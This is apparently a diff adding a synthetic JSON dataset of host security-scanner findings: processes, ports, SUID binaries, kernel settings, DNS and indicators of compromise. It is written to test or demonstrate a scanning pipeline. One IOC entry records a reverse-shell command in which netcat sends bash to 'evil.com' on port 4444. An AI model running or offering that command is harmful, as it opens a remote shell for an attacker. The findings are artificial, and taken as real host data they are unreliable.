@@ -1,0 +1,1271 @@
+{
+  "metadata": {
+    "dataset_id": "9316eb8841062235",
+    "creation_timestamp": "2025-10-01T02:53:05.102947",
+    "version": "2.0",
+    "format": "optimized_json",
+    "compression": false,
+    "langchain_enriched": false,
+    "verification_summary": {
+      "overall_status": "passed",
+      "stages_passed": 4,
+      "quality_score": 0.6665413987893843
+    },
+    "data_characteristics": {
+      "total_findings": 22,
+      "total_correlations": 1,
+      "scanner_coverage": 10
+    },
+    "processing_pipeline": [
+      "data_normalization",
+      "quality_assessment",
+      "basic_enrichment",
+      "structure_optimization",
+      "indexing",
+      "metadata_generation"
+    ]
+  },
+  "data": {
+    "version": "2.0",
+    "generated_at": "2025-10-01T02:53:05.102715",
+    "dataset_type": "synthetic_security_findings",
+    "findings": {
+      "processes": {
+        "info": [
+          {
+            "id": "proc_8035_0",
+            "title": "Running process: node",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Normal system process /usr/bin/node is running with PID 8035",
+            "metadata": {
+              "pid": 8035,
+              "command": "/usr/bin/node",
+              "user": "root",
+              "state": "S (sleeping)",
+              "ppid": 977
+            },
+            "operational_error": false,
+            "category": "processes",
+            "tags": [
+              "processes",
+              "baseline:existing",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.06,
+              "exposure": 0.05,
+              "anomaly": 0.05,
+              "confidence": 0.74
+            },
+            "correlation_refs": [],
+            "baseline_status": "new",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.059,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102366",
+            "_data_quality": 1.0
+          },
+          {
+            "id": "proc_1624_2",
+            "title": "Running process: java",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Normal system process /usr/bin/java is running with PID 1624",
+            "metadata": {
+              "pid": 1624,
+              "command": "/usr/bin/java",
+              "user": "user",
+              "state": "S (sleeping)",
+              "ppid": 657
+            },
+            "operational_error": false,
+            "category": "processes",
+            "tags": [
+              "processes",
+              "baseline:new",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.08,
+              "exposure": 0.12,
+              "anomaly": 0.06,
+              "confidence": 0.86
+            },
+            "correlation_refs": [],
+            "baseline_status": "unknown",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.069,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102412",
+            "_data_quality": 1.0
+          }
+        ],
+        "high": [
+          {
+            "id": "proc_mal_28112_1",
+            "title": "Malicious process detected",
+            "severity": "high",
+            "risk_score": 80.0,
+            "base_severity_score": 80,
+            "description": "Process exhibiting malicious behavior: /usr/local/bin/rootkit",
+            "metadata": {
+              "pid": 28112,
+              "command": "/usr/local/bin/rootkit",
+              "user": "root",
+              "state": "R (running)",
+              "ppid": 1,
+              "deleted_executable": true,
+              "world_writable_executable": true
+            },
+            "operational_error": false,
+            "category": "processes",
+            "tags": [
+              "processes",
+              "baseline:new",
+              "high_priority",
+              "needs_attention"
+            ],
+            "risk_subscores": {
+              "impact": 0.22,
+              "exposure": 0.15,
+              "anomaly": 0.39,
+              "confidence": 0.76
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.896,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 80,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102395",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "network": {
+        "info": [
+          {
+            "id": "net_normal_27017_0",
+            "title": "Normal network service on port 27017",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Standard service listening on port 27017/tcp6",
+            "metadata": {
+              "port": 27017,
+              "protocol": "tcp6",
+              "state": "LISTEN",
+              "local_address": "[::]:27017",
+              "foreign_address": "0.0.0.0:0",
+              "inode": 98779
+            },
+            "operational_error": false,
+            "category": "network",
+            "tags": [
+              "network",
+              "baseline:new",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.15,
+              "exposure": 0.06,
+              "anomaly": 0.09,
+              "confidence": 0.89
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.057,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102429",
+            "_data_quality": 1.0
+          },
+          {
+            "id": "net_normal_3306_1",
+            "title": "Normal network service on port 3306",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Standard service listening on port 3306/tcp6",
+            "metadata": {
+              "port": 3306,
+              "protocol": "tcp6",
+              "state": "LISTEN",
+              "local_address": "[::]:3306",
+              "foreign_address": "0.0.0.0:0",
+              "inode": 63891
+            },
+            "operational_error": false,
+            "category": "network",
+            "tags": [
+              "network",
+              "baseline:existing",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.04,
+              "exposure": 0.15,
+              "anomaly": 0.02,
+              "confidence": 0.77
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.079,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102442",
+            "_data_quality": 1.0
+          },
+          {
+            "id": "net_normal_3306_2",
+            "title": "Normal network service on port 3306",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Standard service listening on port 3306/tcp",
+            "metadata": {
+              "port": 3306,
+              "protocol": "tcp",
+              "state": "LISTEN",
+              "local_address": "0.0.0.0:3306",
+              "foreign_address": "0.0.0.0:0",
+              "inode": 11843
+            },
+            "operational_error": false,
+            "category": "network",
+            "tags": [
+              "network",
+              "baseline:existing",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.1,
+              "exposure": 0.09,
+              "anomaly": 0.17,
+              "confidence": 0.83
+            },
+            "correlation_refs": [],
+            "baseline_status": "new",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.165,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102454",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "world_writable": {
+        "info": [
+          {
+            "id": "world_writable_98da5e62",
+            "title": "World-writable file",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "File is world writable",
+            "metadata": {},
+            "operational_error": false,
+            "category": "world_writable",
+            "tags": [
+              "filesystem",
+              "permissions",
+              "normal"
+            ],
+            "risk_subscores": {
+              "impact": 0.021072103575148077,
+              "exposure": 0.05306399311813133,
+              "anomaly": 0.16924819313359968,
+              "confidence": 0.8992842021216116
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.015077655316991727,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102472",
+            "_data_quality": 0.9
+          },
+          {
+            "id": "world_writable_289fc9cf",
+            "title": "World-writable file",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "File is world writable",
+            "metadata": {},
+            "operational_error": false,
+            "category": "world_writable",
+            "tags": [
+              "filesystem",
+              "permissions",
+              "normal"
+            ],
+            "risk_subscores": {
+              "impact": 0.028714738257924692,
+              "exposure": 0.05718711976586907,
+              "anomaly": 0.11624296524838999,
+              "confidence": 0.8193819268757809
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.022543606245873083,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102485",
+            "_data_quality": 0.9
+          }
+        ]
+      },
+      "modules": {
+        "info": [
+          {
+            "id": "module_btrfs_430bf609",
+            "title": "Module btrfs",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Loaded kernel module",
+            "metadata": {},
+            "operational_error": false,
+            "category": "modules",
+            "tags": [
+              "kernel",
+              "module",
+              "normal"
+            ],
+            "risk_subscores": {
+              "impact": 0.03667707263968675,
+              "exposure": 0.018717872999917146,
+              "anomaly": 0.08848585566522807,
+              "confidence": 0.9740710723381126
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.006225561362975623,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102499",
+            "_data_quality": 0.9
+          },
+          {
+            "id": "module_i915_b1dcb555",
+            "title": "Module i915",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Loaded kernel module",
+            "metadata": {},
+            "operational_error": false,
+            "category": "modules",
+            "tags": [
+              "kernel",
+              "module",
+              "normal"
+            ],
+            "risk_subscores": {
+              "impact": 0.03812253511614093,
+              "exposure": 0.01690862828203705,
+              "anomaly": 0.10275345718023085,
+              "confidence": 0.9587031534085508
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.007345932182399269,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102512",
+            "_data_quality": 0.9
+          }
+        ]
+      },
+      "kernel_params": {
+        "low": [
+          {
+            "id": "kernel_sysrq_8f116be0",
+            "title": "sysrq",
+            "severity": "low",
+            "risk_score": 30.0,
+            "base_severity_score": 30,
+            "description": "SysRq key enabled",
+            "metadata": {
+              "current": "1",
+              "desired": "1",
+              "status": "ok"
+            },
+            "operational_error": false,
+            "category": "kernel_params",
+            "tags": [
+              "kernel",
+              "security",
+              "configuration",
+              "suspicious"
+            ],
+            "risk_subscores": {
+              "impact": 0.3057727938922514,
+              "exposure": 0.11364900743373706,
+              "anomaly": 0.3897315045594839,
+              "confidence": 0.8126276866549814
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.2590031005589759,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 30,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102531",
+            "_data_quality": 1.0
+          }
+        ],
+        "info": [
+          {
+            "id": "kernel_send_redirects_df12abe2",
+            "title": "send_redirects",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Send ICMP redirects",
+            "metadata": {
+              "current": "0",
+              "desired": "1",
+              "status": "mismatch"
+            },
+            "operational_error": false,
+            "category": "kernel_params",
+            "tags": [
+              "kernel",
+              "security",
+              "configuration"
+            ],
+            "risk_subscores": {
+              "impact": 0.0836402511089411,
+              "exposure": 0.07216838612628235,
+              "anomaly": 0.16598477731341343,
+              "confidence": 0.8919831340522533
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.018190971229693285,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102550",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "suid": {
+        "medium": [
+          {
+            "id": "suid_935eb789",
+            "title": "SUID/SGID binary",
+            "severity": "medium",
+            "risk_score": 45.0,
+            "base_severity_score": 45,
+            "description": "Binary has SUID or SGID bit set",
+            "metadata": {},
+            "operational_error": false,
+            "category": "suid",
+            "tags": [
+              "filesystem",
+              "permissions",
+              "suid",
+              "edge_case",
+              "debugging"
+            ],
+            "risk_subscores": {
+              "impact": 0.3566293386222247,
+              "exposure": 0.42557781982622733,
+              "anomaly": 0.6377399532318238,
+              "confidence": 0.7737213576977671
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.3450875353098491,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 45,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102569",
+            "_data_quality": 0.9
+          }
+        ],
+        "high": [
+          {
+            "id": "suid_4021de15",
+            "title": "SUID/SGID binary",
+            "severity": "high",
+            "risk_score": 80.0,
+            "base_severity_score": 80,
+            "description": "Binary has SUID or SGID bit set",
+            "metadata": {},
+            "operational_error": false,
+            "category": "suid",
+            "tags": [
+              "filesystem",
+              "permissions",
+              "suid",
+              "critical",
+              "vulnerability"
+            ],
+            "risk_subscores": {
+              "impact": 0.9042499499074308,
+              "exposure": 0.934341389175986,
+              "anomaly": 0.8508698602166985,
+              "confidence": 0.9174190683885115
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.8058798307416228,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 80,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102582",
+            "_data_quality": 0.9
+          }
+        ]
+      },
+      "ioc": {
+        "high": [
+          {
+            "id": "ioc_72db8e79",
+            "title": "Process IOC Detected",
+            "severity": "high",
+            "risk_score": 80.0,
+            "base_severity_score": 80,
+            "description": "Process with malicious indicators: /usr/bin/nc -e /bin/bash evil.com 4444...",
+            "metadata": {
+              "command": "/usr/bin/nc -e /bin/bash evil.com 4444",
+              "pid": "4347",
+              "pattern_match": "true"
+            },
+            "operational_error": false,
+            "category": "ioc",
+            "tags": [
+              "process",
+              "ioc",
+              "malicious",
+              "compromise"
+            ],
+            "risk_subscores": {
+              "impact": 0.8972932932979415,
+              "exposure": 0.8360069736196634,
+              "anomaly": 0.9313096095494303,
+              "confidence": 0.8752677671508677
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.8843980618884257,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 80,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102598",
+            "_data_quality": 1.0
+          }
+        ],
+        "info": [
+          {
+            "id": "ioc_bf2bf86c",
+            "title": "Process IOC Detected",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "Normal process detected: /usr/bin/nautilus",
+            "metadata": {
+              "command": "/usr/bin/nautilus",
+              "pid": "6120",
+              "pattern_match": "false"
+            },
+            "operational_error": false,
+            "category": "ioc",
+            "tags": [
+              "process",
+              "ioc",
+              "normal"
+            ],
+            "risk_subscores": {
+              "impact": 0.046796554459965424,
+              "exposure": 0.023902633287231665,
+              "anomaly": 0.06446561259023285,
+              "confidence": 0.8459705218992934
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.004915886876676035,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102612",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "mac": {
+        "info": [
+          {
+            "id": "mac_grsecurity_ad173cdc",
+            "title": "grsecurity status",
+            "severity": "info",
+            "risk_score": 10.0,
+            "base_severity_score": 10,
+            "description": "grsecurity detection",
+            "metadata": {
+              "present": "false",
+              "enabled": "false"
+            },
+            "operational_error": false,
+            "category": "mac",
+            "tags": [
+              "mac",
+              "grsecurity",
+              "security"
+            ],
+            "risk_subscores": {
+              "impact": 0.10356079629383119,
+              "exposure": 0.18033386092278583,
+              "anomaly": 0.2083918380862337,
+              "confidence": 0.7658759828337337
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.015721967013245998,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 10,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102626",
+            "_data_quality": 1.0
+          }
+        ],
+        "low": [
+          {
+            "id": "mac_selinux_d8770082",
+            "title": "SELinux status",
+            "severity": "low",
+            "risk_score": 30.0,
+            "base_severity_score": 30,
+            "description": "SELinux detection",
+            "metadata": {
+              "present": "false"
+            },
+            "operational_error": false,
+            "category": "mac",
+            "tags": [
+              "mac",
+              "selinux",
+              "security"
+            ],
+            "risk_subscores": {
+              "impact": 0.11753478345185227,
+              "exposure": 0.3999171460315066,
+              "anomaly": 0.39442032620260925,
+              "confidence": 0.873824142599049
+            },
+            "correlation_refs": [],
+            "baseline_status": "existing",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.13100595350080219,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 30,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102639",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "endpoint_behavior": {
+        "medium": [
+          {
+            "id": "endpoint_behavior_0_user1079",
+            "title": "Endpoint behavior anomaly for user1079",
+            "severity": "medium",
+            "risk_score": 52.0,
+            "base_severity_score": 52,
+            "description": "Unusual privilege_escalation pattern detected for user1079",
+            "metadata": {
+              "user": "user1079",
+              "role": "developer",
+              "activity": "privilege_escalation",
+              "host": "host-10",
+              "sequence_length": 4,
+              "timestamp": "2025-10-01T07:43:05.076821",
+              "time_delta_minutes": 130,
+              "context": "after_hours_activity"
+            },
+            "operational_error": false,
+            "category": "endpoint_behavior",
+            "tags": [
+              "endpoint_behavior",
+              "baseline:new",
+              "moderate_risk"
+            ],
+            "risk_subscores": {
+              "impact": 0.34,
+              "exposure": 0.45,
+              "anomaly": 0.06,
+              "confidence": 0.75
+            },
+            "correlation_refs": [],
+            "baseline_status": "new",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.53,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 52,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102652",
+            "_data_quality": 1.0
+          },
+          {
+            "id": "endpoint_behavior_1_user1028",
+            "title": "Endpoint behavior anomaly for user1028",
+            "severity": "medium",
+            "risk_score": 57.0,
+            "base_severity_score": 57,
+            "description": "Unusual process_spawn pattern detected for user1028",
+            "metadata": {
+              "user": "user1028",
+              "role": "developer",
+              "activity": "process_spawn",
+              "host": "host-26",
+              "sequence_length": 6,
+              "timestamp": "2025-10-01T04:45:05.076821",
+              "time_delta_minutes": 308,
+              "context": "rare_binary"
+            },
+            "operational_error": false,
+            "category": "endpoint_behavior",
+            "tags": [
+              "endpoint_behavior",
+              "baseline:existing",
+              "moderate_risk"
+            ],
+            "risk_subscores": {
+              "impact": 0.54,
+              "exposure": 0.23,
+              "anomaly": 0.09,
+              "confidence": 0.93
+            },
+            "correlation_refs": [],
+            "baseline_status": "unknown",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.56,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 57,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102666",
+            "_data_quality": 1.0
+          }
+        ]
+      },
+      "dns": {
+        "info": [
+          {
+            "id": "dns_0_info",
+            "title": "DNS activity: www.example0.com",
+            "severity": "info",
+            "risk_score": 12.0,
+            "base_severity_score": 12,
+            "description": "Standard DNS query observed for domain www.example0.com",
+            "metadata": {
+              "domain": "www.example0.com",
+              "ttl": 417,
+              "resolver": "8.8.8.8",
+              "query_type": "TXT",
+              "client_ip": "10.0.1.123",
+              "query_timestamp": "2025-10-01T09:21:05.076780",
+              "detections": []
+            },
+            "operational_error": false,
+            "category": "dns",
+            "tags": [
+              "dns",
+              "baseline:new",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.17,
+              "exposure": 0.07,
+              "anomaly": 0.02,
+              "confidence": 0.91
+            },
+            "correlation_refs": [],
+            "baseline_status": "new",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.076,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 12,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102679",
+            "_data_quality": 1.0
+          },
+          {
+            "id": "dns_1_info",
+            "title": "DNS activity: www.example1.com",
+            "severity": "info",
+            "risk_score": 12.0,
+            "base_severity_score": 12,
+            "description": "Standard DNS query observed for domain www.example1.com",
+            "metadata": {
+              "domain": "www.example1.com",
+              "ttl": 592,
+              "resolver": "8.8.8.8",
+              "query_type": "A",
+              "client_ip": "10.0.9.17",
+              "query_timestamp": "2025-10-01T07:59:05.076780",
+              "detections": []
+            },
+            "operational_error": false,
+            "category": "dns",
+            "tags": [
+              "dns",
+              "baseline:existing",
+              "low_priority"
+            ],
+            "risk_subscores": {
+              "impact": 0.06,
+              "exposure": 0.11,
+              "anomaly": 0.02,
+              "confidence": 0.72
+            },
+            "correlation_refs": [],
+            "baseline_status": "unknown",
+            "severity_source": "raw",
+            "allowlist_reason": null,
+            "probability_actionable": 0.198,
+            "graph_degree": null,
+            "cluster_id": null,
+            "rationale": null,
+            "risk_total": 12,
+            "host_role": null,
+            "host_role_rationale": null,
+            "metric_drift": null,
+            "_processed_at": "2025-10-01T02:53:05.102692",
+            "_data_quality": 1.0
+          }
+        ]
+      }
+    },
+    "correlations": [
+      {
+        "id": "corr_filesystem_943a146a_ebbe4216",
+        "title": "IOC with file permission vulnerabilities: Process IOC Detected",
+        "severity": "high",
+        "risk_score": 85.0,
+        "base_severity_score": 85,
+        "description": "Indicator of compromise 'Process IOC Detected' detected alongside file permission issues",
+        "metadata": {
+          "ioc_type": "Process IOC Detected",
+          "file_issues_count": 2,
+          "correlation_reason": "compromise_indicators_with_permissions"
+        },
+        "operational_error": false,
+        "category": "correlation",
+        "tags": [
+          "correlation",
+          "ioc_file_permissions",
+          "filesystem"
+        ],
+        "risk_subscores": {
+          "impact": 0.26481063522145143,
+          "exposure": 0.4187338785997473,
+          "anomaly": 0.37385902116432645,
+          "confidence": 0.7194055906096033
+        },
+        "correlation_refs": [
+          "ioc_72db8e79",
+          "suid_935eb789",
+          "suid_4021de15"
+        ],
+        "baseline_status": "new",
+        "severity_source": "correlation",
+        "allowlist_reason": null,
+        "probability_actionable": 0.6462769900991054,
+        "graph_degree": 3,
+        "cluster_id": "corr_filesystem_943a146a",
+        "rationale": "Correlation analysis by filesystem producer",
+        "risk_total": 85,
+        "host_role": null,
+        "host_role_rationale": null,
+        "metric_drift": null,
+        "correlation_type": "ioc_file_permissions",
+        "correlation_strength": 0.7562348914629574,
+        "timestamp": "2025-10-01T02:53:05.095518",
+        "_correlation_strength": 0.7562348914629574,
+        "_processed_at": "2025-10-01T02:53:05.102711"
+      }
+    ],
+    "statistics": {
+      "total_findings": 22,
+      "total_correlations": 1,
+      "scanner_types": 10,
+      "severity_distribution": {
+        "info": 14,
+        "high": 3,
+        "low": 2,
+        "medium": 3
+      },
+      "category_distribution": {
+        "processes": 3,
+        "network": 3,
+        "world_writable": 2,
+        "modules": 2,
+        "kernel_params": 2,
+        "suid": 2,
+        "ioc": 2,
+        "mac": 2,
+        "endpoint_behavior": 2,
+        "dns": 2
+      },
+      "risk_score_stats": {
+        "mean": 27.18,
+        "median": 10.0,
+        "min": 10.0,
+        "max": 80.0,
+        "std_dev": 26.01
+      },
+      "correlation_stats": {
+        "types": {
+          "ioc_file_permissions": 1
+        },
+        "avg_strength": 0.76
+      }
+    },
+    "indexes": {
+      "findings_by_id": {
+        "proc_8035_0": {
+          "scanner": "processes",
+          "severity": "info",
+          "category": "processes"
+        },
+        "proc_mal_28112_1": {
+          "scanner": "processes",
+          "severity": "high",
+          "category": "processes"
+        },
+        "proc_1624_2": {
+          "scanner": "processes",
+          "severity": "info",
+          "category": "processes"
+        },
+        "net_normal_27017_0": {
+          "scanner": "network",
+          "severity": "info",
+          "category": "network"
+        },
+        "net_normal_3306_1": {
+          "scanner": "network",
+          "severity": "info",
+          "category": "network"
+        },
+        "net_normal_3306_2": {
+          "scanner": "network",
+          "severity": "info",
+          "category": "network"
+        },
+        "world_writable_98da5e62": {
+          "scanner": "world_writable",
+          "severity": "info",
+          "category": "world_writable"
+        },
+        "world_writable_289fc9cf": {
+          "scanner": "world_writable",
+          "severity": "info",
+          "category": "world_writable"
+        },
+        "module_btrfs_430bf609": {
+          "scanner": "modules",
+          "severity": "info",
+          "category": "modules"
+        },
+        "module_i915_b1dcb555": {
+          "scanner": "modules",
+          "severity": "info",
+          "category": "modules"
+        },
+        "kernel_sysrq_8f116be0": {
+          "scanner": "kernel_params",
+          "severity": "low",
+          "category": "kernel_params"
+        },
+        "kernel_send_redirects_df12abe2": {
+          "scanner": "kernel_params",
+          "severity": "info",
+          "category": "kernel_params"
+        },
+        "suid_935eb789": {
+          "scanner": "suid",
+          "severity": "medium",
+          "category": "suid"
+        },
+        "suid_4021de15": {
+          "scanner": "suid",
+          "severity": "high",
+          "category": "suid"
+        },
+        "ioc_72db8e79": {
+          "scanner": "ioc",
+          "severity": "high",
+          "category": "ioc"
+        },
+        "ioc_bf2bf86c": {
+          "scanner": "ioc",
+          "severity": "info",
+          "category": "ioc"
+        },
+        "mac_grsecurity_ad173cdc": {
+          "scanner": "mac",
+          "severity": "info",
+          "category": "mac"
+        },
+        "mac_selinux_d8770082": {
+          "scanner": "mac",
+          "severity": "low",
+          "category": "mac"
+        },
+        "endpoint_behavior_0_user1079": {
+          "scanner": "endpoint_behavior",
+          "severity": "medium",
+          "category": "endpoint_behavior"
+        },
+        "endpoint_behavior_1_user1028": {
+          "scanner": "endpoint_behavior",
+          "severity": "medium",
+          "category": "endpoint_behavior"
+        },
+        "dns_0_info": {
+          "scanner": "dns",
+          "severity": "info",
+          "category": "dns"
+        },
+        "dns_1_info": {
+          "scanner": "dns",
+          "severity": "info",
+          "category": "dns"
+        }
+      },
+      "findings_by_severity": {
+        "info": [
+          "proc_8035_0",
+          "proc_1624_2",
+          "net_normal_27017_0",
+          "net_normal_3306_1",
+          "net_normal_3306_2",
+          "world_writable_98da5e62",
+          "world_writable_289fc9cf",
+          "module_btrfs_430bf609",
+          "module_i915_b1dcb555",
+          "kernel_send_redirects_df12abe2",
+          "ioc_bf2bf86c",
+          "mac_grsecurity_ad173cdc",
+          "dns_0_info",
+          "dns_1_info"
+        ],
+        "high": [
+          "proc_mal_28112_1",
+          "suid_4021de15",
+          "ioc_72db8e79"
+        ],
+        "low": [
+          "kernel_sysrq_8f116be0",
+          "mac_selinux_d8770082"
+        ],
+        "medium": [
+          "suid_935eb789",
+          "endpoint_behavior_0_user1079",
+          "endpoint_behavior_1_user1028"
+        ]
+      },
+      "findings_by_category": {
+        "processes": [
+          "proc_8035_0",
+          "proc_mal_28112_1",
+          "proc_1624_2"
+        ],
+        "network": [
+          "net_normal_27017_0",
+          "net_normal_3306_1",
+          "net_normal_3306_2"
+        ],
+        "world_writable": [
+          "world_writable_98da5e62",
+          "world_writable_289fc9cf"
+        ],
+        "modules": [
+          "module_btrfs_430bf609",
+          "module_i915_b1dcb555"
+        ],
+        "kernel_params": [
+          "kernel_sysrq_8f116be0",
+          "kernel_send_redirects_df12abe2"
+        ],
+        "suid": [
+          "suid_935eb789",
+          "suid_4021de15"
+        ],
+        "ioc": [
+          "ioc_72db8e79",
+          "ioc_bf2bf86c"
+        ],
+        "mac": [
+          "mac_grsecurity_ad173cdc",
+          "mac_selinux_d8770082"
+        ],
+        "endpoint_behavior": [
+          "endpoint_behavior_0_user1079",
+          "endpoint_behavior_1_user1028"
+        ],
+        "dns": [
+          "dns_0_info",
+          "dns_1_info"
+        ]
+      },
+      "correlations_by_type": {
+        "ioc_file_permissions": [
+          "corr_filesystem_943a146a_ebbe4216"
+        ]
